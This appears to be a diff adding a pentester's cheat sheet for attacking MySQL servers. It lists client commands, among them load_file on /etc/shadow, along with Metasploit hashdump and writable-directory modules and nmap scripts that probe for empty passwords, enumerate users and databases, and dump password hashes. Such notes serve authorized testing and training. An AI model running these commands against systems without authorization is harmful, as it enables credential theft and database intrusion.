@@ -1,0 +1,34 @@
+MySQL Connect:
+--------------
+
+> mysql -h <IP> -u <user> -p <pass>
+> SHOW DATABASES;
+> USE <DATABASE_NAME>;
+  > SHOW TABLES;
+  > select * from <table>;
+> select load_file("/etc/shadow");    // access local files on machine
+
+  
+msfconsole:
+--------------
+
+> auxiliary/scanner/mysql/mysql_writable_dirs
+  > set dir_list /usr/share/metasploit-framework/data/wordlists/directory.txt
+  > setg RHOSTS     // set RHOSTS global
+  > set VERBOSE false
+  > set password "" // NULL Password
+  
+> auxiliary/scanner/mysql/mysql_hashdump
+  > username <username>
+  > set password ""
+  
+
+> nmap <IP> -sV -p 3306 --script=mysql-empty-password                                                     // check for users with empty passowrds
+> nmap <IP> -sV -p 3306 --script=mysql-info                                                               // version, capabilities
+> nmap <IP> -sV -p 3306 --script=mysql-users --script-args="mysqluser=<user>,mysqlpass=''"                // check for users on db
+> nmap <IP> -sV -p 3306 --script=mysql-databases --script-args="mysqluser=<user>,mysqlpass=''"            // check for databases
+> nmap <IP> -sV -p 3306 --script=mysql-variables --script-args="mysqluser=<user>,mysqlpass=''"            // check variables - data directory !!
+> nmap <IP> -sV -p 3306 --script=mysql-audit 
+  > --script-args="mysql-audit.username=<user>,mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'"
+> nmap <IP> -sV -p 3306 --script=mysql-dump-hashes --script-args="username=<user>,password=''"
+> nmap <IP> -sV -p 3306 --script=mysql-query --script-args="query='SELECT COUNT(*) FROM <DATABASE>.<TABLE>;',username=<user>,password=''"
